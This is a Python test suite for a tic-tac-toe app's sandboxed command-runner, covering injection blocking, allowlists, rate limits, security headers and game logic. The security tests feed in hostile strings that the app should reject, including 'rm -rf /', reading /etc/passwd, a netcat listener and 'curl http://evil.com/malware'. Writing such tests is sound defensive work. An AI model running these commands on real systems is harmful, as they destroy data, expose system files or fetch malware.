"""
test_app.py — Comprehensive Test Suite for Quantum Tic-Tac-Toe
==============================================================
Tests cover:
  - Command sanitization & injection prevention (Security)
  - Allowlist enforcement (Security)
  - Rate limiting (Efficiency / Security)
  - Built-in commands (Functionality)
  - Tic-Tac-Toe win/draw logic (Game correctness)
  - Edge cases & boundary conditions (Robustness)

Run with:  python -m pytest test_app.py -v
"""

import unittest
import sys
import os

# Add parent directory so we can import from app
sys.path.insert(0, os.path.dirname(__file__))

from app import (
    sanitize_and_validate,
    execute_safe_command,
    is_rate_limited,
    ALLOWED_COMMANDS,
    BLOCKED_PATTERNS,
    _request_log,
)


# ---------------------------------------------------------------------------
# Helper: game win-check logic (mirrors script.js WINNING_CONDITIONS)
# ---------------------------------------------------------------------------
WINNING_CONDITIONS = [
    [0, 1, 2], [3, 4, 5], [6, 7, 8],   # rows
    [0, 3, 6], [1, 4, 7], [2, 5, 8],   # columns
    [0, 4, 8], [2, 4, 6],               # diagonals
]


def check_winner(board: list) -> str | None:
    """Return 'X', 'O', 'draw', or None (game ongoing)."""
    for a, b, c in WINNING_CONDITIONS:
        if board[a] and board[a] == board[b] == board[c]:
            return board[a]
    if "" not in board:
        return "draw"
    return None


# ===========================================================================
# 1. SECURITY — Input Sanitization & Injection Prevention
# ===========================================================================
class TestSecuritySanitization(unittest.TestCase):

    def test_empty_command_rejected(self):
        ok, _, err = sanitize_and_validate("")
        self.assertFalse(ok)
        self.assertIn("No command", err)

    def test_command_too_long_rejected(self):
        ok, _, err = sanitize_and_validate("echo " + "A" * 300)
        self.assertFalse(ok)
        self.assertIn("too long", err)

    def test_semicolon_injection_rejected(self):
        ok, _, err = sanitize_and_validate("help; rm -rf /")
        self.assertFalse(ok)
        self.assertIn("blocked", err.lower())

    def test_pipe_injection_rejected(self):
        ok, _, err = sanitize_and_validate("ls | cat /etc/passwd")
        self.assertFalse(ok)

    def test_amp_injection_rejected(self):
        ok, _, err = sanitize_and_validate("echo hello && rm -rf /")
        self.assertFalse(ok)

    def test_subshell_dollar_rejected(self):
        ok, _, err = sanitize_and_validate("echo $(whoami)")
        self.assertFalse(ok)

    def test_backtick_injection_rejected(self):
        ok, _, err = sanitize_and_validate("echo `id`")
        self.assertFalse(ok)

    def test_redirect_out_rejected(self):
        ok, _, err = sanitize_and_validate("echo evil > /tmp/x")
        self.assertFalse(ok)

    def test_redirect_in_rejected(self):
        ok, _, err = sanitize_and_validate("python3 < /etc/passwd")
        self.assertFalse(ok)

    def test_rm_command_rejected(self):
        ok, _, err = sanitize_and_validate("rm -rf /")
        self.assertFalse(ok)

    def test_sudo_rejected(self):
        ok, _, err = sanitize_and_validate("sudo apt install curl")
        self.assertFalse(ok)

    def test_netcat_rejected(self):
        ok, _, err = sanitize_and_validate("nc -lvnp 4444")
        self.assertFalse(ok)

    def test_python_exec_rejected(self):
        ok, _, err = sanitize_and_validate("python3 -c 'import os; os.system(\"id\")'")
        self.assertFalse(ok)

    def test_curl_url_rejected(self):
        # curl --version is allowed, but curl http://evil.com should not be
        ok, _, err = sanitize_and_validate("curl http://evil.com/malware")
        self.assertFalse(ok)

    def test_del_windows_rejected(self):
        ok, _, err = sanitize_and_validate("del /F /Q C:\\Windows\\System32")
        self.assertFalse(ok)

    def test_shutdown_rejected(self):
        ok, _, err = sanitize_and_validate("shutdown -h now")
        self.assertFalse(ok)


# ===========================================================================
# 2. SECURITY — Allowlist Enforcement
# ===========================================================================
class TestAllowlist(unittest.TestCase):

    def test_unknown_command_rejected(self):
        ok, _, err = sanitize_and_validate("nmap -sV localhost")
        self.assertFalse(ok)
        self.assertIn("not in the safe command list", err)

    def test_invalid_arg_for_allowed_cmd(self):
        ok, _, err = sanitize_and_validate("uname -z")
        self.assertFalse(ok)
        self.assertIn("not allowed", err)

    def test_cat_only_readme_allowed(self):
        ok, _, err = sanitize_and_validate("cat /etc/passwd")
        self.assertFalse(ok)

    def test_cat_readme_allowed(self):
        ok, parts, err = sanitize_and_validate("cat README.md")
        self.assertTrue(ok)
        self.assertIsNone(err)

    def test_echo_free_text_allowed(self):
        ok, parts, err = sanitize_and_validate("echo Hello World")
        self.assertTrue(ok)

    def test_help_allowed(self):
        ok, parts, err = sanitize_and_validate("help")
        self.assertTrue(ok)

    def test_clear_allowed(self):
        ok, parts, err = sanitize_and_validate("clear")
        self.assertTrue(ok)

    def test_cls_allowed(self):
        ok, parts, err = sanitize_and_validate("cls")
        self.assertTrue(ok)

    def test_date_allowed(self):
        ok, parts, err = sanitize_and_validate("date")
        self.assertTrue(ok)

    def test_env_allowed(self):
        ok, parts, err = sanitize_and_validate("env")
        self.assertTrue(ok)

    def test_python_version_allowed(self):
        ok, parts, err = sanitize_and_validate("python3 --version")
        self.assertTrue(ok)

    def test_case_insensitive_cmd(self):
        ok, parts, err = sanitize_and_validate("HELP")
        self.assertTrue(ok)


# ===========================================================================
# 3. BUILT-IN COMMAND EXECUTION
# ===========================================================================
class TestBuiltinCommands(unittest.TestCase):

    def test_help_returns_command_list(self):
        result = execute_safe_command(["help"])
        self.assertEqual(result["returncode"], 0)
        self.assertIn("help", result["stdout"])
        self.assertIn("echo", result["stdout"])

    def test_clear_returns_sentinel(self):
        result = execute_safe_command(["clear"])
        self.assertEqual(result["stdout"], "__CLEAR__")
        self.assertEqual(result["returncode"], 0)

    def test_cls_returns_sentinel(self):
        result = execute_safe_command(["cls"])
        self.assertEqual(result["stdout"], "__CLEAR__")

    def test_env_returns_safe_vars_only(self):
        result = execute_safe_command(["env"])
        self.assertEqual(result["returncode"], 0)
        self.assertIn("PORT", result["stdout"])
        # Must NOT leak sensitive keys
        self.assertNotIn("AWS_SECRET", result["stdout"])
        self.assertNotIn("DB_PASSWORD", result["stdout"])

    def test_stdout_capped_at_4096(self):
        """Command output must be capped to prevent data exfiltration."""
        # Simulate a very large stdout
        import app as app_module
        original = app_module.subprocess.run
        class FakeResult:
            stdout = "A" * 10000
            stderr = ""
            returncode = 0
        try:
            app_module.subprocess.run = lambda *a, **kw: FakeResult()
            result = execute_safe_command(["echo", "test"])
            self.assertLessEqual(len(result["stdout"]), 4096)
        finally:
            app_module.subprocess.run = original


# ===========================================================================
# 4. EFFICIENCY — Rate Limiting
# ===========================================================================
class TestRateLimiting(unittest.TestCase):

    def setUp(self):
        # Clear rate log for test IP
        _request_log["test_ip_rate"] = []

    def test_under_limit_not_blocked(self):
        for _ in range(19):
            self.assertFalse(is_rate_limited("test_ip_rate"))

    def test_at_limit_blocked(self):
        for _ in range(20):
            is_rate_limited("test_ip_rate")
        self.assertTrue(is_rate_limited("test_ip_rate"))

    def test_different_ips_independent(self):
        _request_log["ip_a"] = []
        _request_log["ip_b"] = []
        for _ in range(20):
            is_rate_limited("ip_a")
        self.assertTrue(is_rate_limited("ip_a"))
        self.assertFalse(is_rate_limited("ip_b"))


# ===========================================================================
# 5. GAME LOGIC — Tic-Tac-Toe Win / Draw Conditions
# ===========================================================================
class TestGameLogic(unittest.TestCase):

    def _board(self, positions: str) -> list:
        """Build a 9-element board from a 9-char string ('X', 'O', ' ')."""
        return [c if c in ("X", "O") else "" for c in positions]

    # --- Win conditions ---
    def test_x_wins_top_row(self):
        board = self._board("XXX OO   ")
        self.assertEqual(check_winner(board), "X")

    def test_x_wins_middle_row(self):
        board = self._board("OO XXX O ")
        self.assertEqual(check_winner(board), "X")

    def test_x_wins_bottom_row(self):
        board = self._board("OO  O XXX")
        self.assertEqual(check_winner(board), "X")

    def test_x_wins_left_column(self):
        board = self._board("X O X O X ")
        # indexes 0,3,6 = X
        b = ["X","O","","X","","O","X","",""]
        self.assertEqual(check_winner(b), "X")

    def test_x_wins_center_column(self):
        b = ["O","X","","","X","O","","X",""]
        self.assertEqual(check_winner(b), "X")

    def test_x_wins_right_column(self):
        b = ["O","","X","O","","X","","","X"]
        self.assertEqual(check_winner(b), "X")

    def test_x_wins_main_diagonal(self):
        b = ["X","O","","O","X","","","","X"]
        self.assertEqual(check_winner(b), "X")

    def test_x_wins_anti_diagonal(self):
        b = ["O","","X","","X","","X","","O"]
        self.assertEqual(check_winner(b), "X")

    def test_o_wins(self):
        b = ["O","O","O","X","X","","","",""]
        self.assertEqual(check_winner(b), "O")

    def test_draw_full_board_no_winner(self):
        b = ["X","O","X","O","O","X","X","X","O"]
        self.assertEqual(check_winner(b), "draw")

    def test_game_ongoing_returns_none(self):
        b = ["X","","","","O","","","",""]
        self.assertIsNone(check_winner(b))

    def test_empty_board_is_ongoing(self):
        b = [""] * 9
        self.assertIsNone(check_winner(b))

    def test_all_winning_conditions_covered(self):
        self.assertEqual(len(WINNING_CONDITIONS), 8, "Must have exactly 8 win conditions")

    # --- Edge cases ---
    def test_partial_board_no_false_positive(self):
        b = ["X","O","X","O","X","O","","",""]
        # Not a win yet (no complete line for X or O in column 0 / diag)
        self.assertIsNone(check_winner(b))


# ===========================================================================
# 6. BLOCKED PATTERN REGEX
# ===========================================================================
class TestBlockedPatterns(unittest.TestCase):

    def _blocked(self, s):
        return bool(BLOCKED_PATTERNS.search(s))

    def test_semicolon_blocked(self):
        self.assertTrue(self._blocked("ls; rm -rf /"))

    def test_pipe_blocked(self):
        self.assertTrue(self._blocked("ls | grep root"))

    def test_double_amp_blocked(self):
        self.assertTrue(self._blocked("echo ok && shutdown now"))

    def test_dollar_subshell_blocked(self):
        self.assertTrue(self._blocked("echo $(id)"))

    def test_backtick_blocked(self):
        self.assertTrue(self._blocked("echo `id`"))

    def test_redirect_out_blocked(self):
        self.assertTrue(self._blocked("echo evil > /tmp/x"))

    def test_redirect_in_blocked(self):
        self.assertTrue(self._blocked("python < /dev/urandom"))

    def test_rm_blocked(self):
        self.assertTrue(self._blocked("rm -rf /home"))

    def test_del_blocked(self):
        self.assertTrue(self._blocked("del C:\\users"))

    def test_safe_echo_not_blocked(self):
        self.assertFalse(self._blocked("echo Hello World"))

    def test_safe_date_not_blocked(self):
        self.assertFalse(self._blocked("date"))

    def test_safe_python_version_not_blocked(self):
        self.assertFalse(self._blocked("python3 --version"))


# ===========================================================================
# 7. ALLOWED COMMAND METADATA INTEGRITY
# ===========================================================================
class TestAllowedCommandsMetadata(unittest.TestCase):

    def test_all_commands_have_description(self):
        for name, meta in ALLOWED_COMMANDS.items():
            self.assertIn("description", meta, f"Missing description for '{name}'")
            self.assertTrue(meta["description"], f"Empty description for '{name}'")

    def test_all_commands_have_args(self):
        for name, meta in ALLOWED_COMMANDS.items():
            self.assertIn("args", meta, f"Missing args for '{name}'")
            self.assertIsInstance(meta["args"], list)


# ===========================================================================
# 8. HTTP HANDLER — Health Endpoint & Security Headers
# ===========================================================================
class TestHTTPHandler(unittest.TestCase):
    """Integration-style tests for the SecureHandler endpoints."""

    def setUp(self):
        """Start the server in a background thread for each test."""
        from http.server import HTTPServer
        import threading
        import app as app_module

        self._port = 18765
        self._server = HTTPServer(("localhost", self._port), app_module.SecureHandler)
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()

    def tearDown(self):
        self._server.shutdown()

    def _url(self, path=""):
        return f"http://localhost:{self._port}{path}"

    def test_health_endpoint_returns_200(self):
        import urllib.request
        with urllib.request.urlopen(self._url("/health")) as resp:
            self.assertEqual(resp.status, 200)

    def test_health_endpoint_returns_json(self):
        import urllib.request, json
        with urllib.request.urlopen(self._url("/health")) as resp:
            data = json.loads(resp.read())
        self.assertEqual(data["status"], "ok")
        self.assertIn("service", data)
        self.assertIn("version", data)

    def test_healthz_alias_returns_200(self):
        import urllib.request
        with urllib.request.urlopen(self._url("/healthz")) as resp:
            self.assertEqual(resp.status, 200)

    def test_security_headers_present(self):
        import urllib.request
        with urllib.request.urlopen(self._url("/health")) as resp:
            headers = dict(resp.headers)
        self.assertIn("X-Frame-Options",    headers)
        self.assertIn("X-Content-Type-Options", headers)
        self.assertIn("Content-Security-Policy", headers)

    def test_x_frame_options_is_deny(self):
        import urllib.request
        with urllib.request.urlopen(self._url("/health")) as resp:
            self.assertEqual(resp.headers.get("X-Frame-Options"), "DENY")

    def test_content_type_options_nosniff(self):
        import urllib.request
        with urllib.request.urlopen(self._url("/health")) as resp:
            self.assertEqual(resp.headers.get("X-Content-Type-Options"), "nosniff")

    def test_csp_blocks_inline_unknown_origins(self):
        import urllib.request
        with urllib.request.urlopen(self._url("/health")) as resp:
            csp = resp.headers.get("Content-Security-Policy", "")
        self.assertIn("default-src", csp)
        self.assertIn("frame-ancestors 'none'", csp)

    def test_csp_allows_firebase(self):
        import urllib.request
        with urllib.request.urlopen(self._url("/health")) as resp:
            csp = resp.headers.get("Content-Security-Policy", "")
        self.assertIn("firebaseio.com", csp)
        self.assertIn("gstatic.com", csp)

    def test_post_run_command_missing_command(self):
        import urllib.request, urllib.error, json
        payload = json.dumps({"command": ""}).encode()
        req = urllib.request.Request(
            self._url("/run_command"),
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            resp = urllib.request.urlopen(req)
            data = json.loads(resp.read())
            self.assertFalse(data.get("stdout") and data.get("returncode") == 0)
        except urllib.error.HTTPError as e:
            # 403 is acceptable for blocked/empty command
            self.assertIn(e.code, (400, 403))

    def test_post_run_command_help_works(self):
        import urllib.request, json
        payload = json.dumps({"command": "help"}).encode()
        req = urllib.request.Request(
            self._url("/run_command"),
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req) as resp:
            data = json.loads(resp.read())
        self.assertEqual(data["returncode"], 0)
        self.assertIn("help", data["stdout"])

    def test_post_to_unknown_path_returns_404(self):
        import urllib.request, urllib.error, json
        payload = json.dumps({"x": 1}).encode()
        req = urllib.request.Request(
            self._url("/does_not_exist"),
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with self.assertRaises(urllib.error.HTTPError) as ctx:
            urllib.request.urlopen(req)
        self.assertEqual(ctx.exception.code, 404)


# ===========================================================================
# 9. ADDITIONAL SANITIZATION EDGE CASES
# ===========================================================================
class TestSanitizationEdgeCases(unittest.TestCase):

    def test_whitespace_only_command_rejected(self):
        ok, _, err = sanitize_and_validate("   ")
        self.assertFalse(ok)

    def test_exactly_200_chars_allowed(self):
        cmd = "echo " + "A" * 195   # exactly 200
        ok, _, _ = sanitize_and_validate(cmd)
        self.assertTrue(ok)

    def test_exactly_201_chars_rejected(self):
        cmd = "echo " + "A" * 196   # 201
        ok, _, err = sanitize_and_validate(cmd)
        self.assertFalse(ok)
        self.assertIn("too long", err)

    def test_command_with_tabs_normalized(self):
        # Tabs should not bypass validation
        ok, _, _ = sanitize_and_validate("echo\thello")
        # split() handles tabs as whitespace, so this should pass
        # (echo with any argument is allowed since args = ["*"])
        self.assertTrue(ok)

    def test_reboot_command_rejected(self):
        ok, _, _ = sanitize_and_validate("reboot")
        self.assertFalse(ok)

    def test_kill_command_rejected(self):
        ok, _, _ = sanitize_and_validate("kill -9 1")
        self.assertFalse(ok)

    def test_chown_command_rejected(self):
        ok, _, _ = sanitize_and_validate("chown root /etc/passwd")
        self.assertFalse(ok)

    def test_eval_rejected(self):
        ok, _, _ = sanitize_and_validate("eval echo hello")
        self.assertFalse(ok)


# ===========================================================================
# 10. EXECUTE SAFE COMMAND — Error Paths
# ===========================================================================
class TestExecuteSafeCommandErrors(unittest.TestCase):

    def test_nonexistent_binary_returns_127(self):
        # Force a FileNotFoundError by using a command name that can't exist
        result = execute_safe_command(["__no_such_binary_xyz__"])
        self.assertEqual(result["returncode"], 127)
        self.assertIn("not found", result["stderr"])

    def test_result_has_all_required_keys(self):
        result = execute_safe_command(["help"])
        self.assertIn("stdout",     result)
        self.assertIn("stderr",     result)
        self.assertIn("returncode", result)

    def test_help_mentions_all_allowed_commands(self):
        result = execute_safe_command(["help"])
        for cmd_name in ["echo", "date", "pwd", "ls", "env", "clear"]:
            self.assertIn(cmd_name, result["stdout"],
                          f"'{cmd_name}' missing from help output")


# ===========================================================================
# 11. GAME LOGIC — Extra Win/Draw Scenarios
# ===========================================================================
class TestExtraGameLogic(unittest.TestCase):

    def test_single_x_not_a_win(self):
        b = ["X"] + [""] * 8
        self.assertIsNone(check_winner(b))

    def test_two_xs_not_a_win(self):
        b = ["X", "X", ""] + [""] * 6
        self.assertIsNone(check_winner(b))

    def test_mixed_board_no_winner(self):
        # Board: X O X / O X O / O X O
        # indices 2,4,6 = X,X,O — not a win; full board = draw
        b = ["X", "O", "X", "O", "X", "O", "O", "X", "O"]
        self.assertEqual(check_winner(b), "draw")

    def test_o_wins_middle_row(self):
        b = ["X", "X", "", "O", "O", "O", "", "", ""]
        self.assertEqual(check_winner(b), "O")

    def test_board_with_9_moves_draw_variant(self):
        # XOXOXOXOX style (no three in row)
        b = ["X","O","X","O","X","O","O","X","O"]
        self.assertEqual(check_winner(b), "draw")


# ---------------------------------------------------------------------------
if __name__ == "__main__":
    unittest.main(verbosity=2)
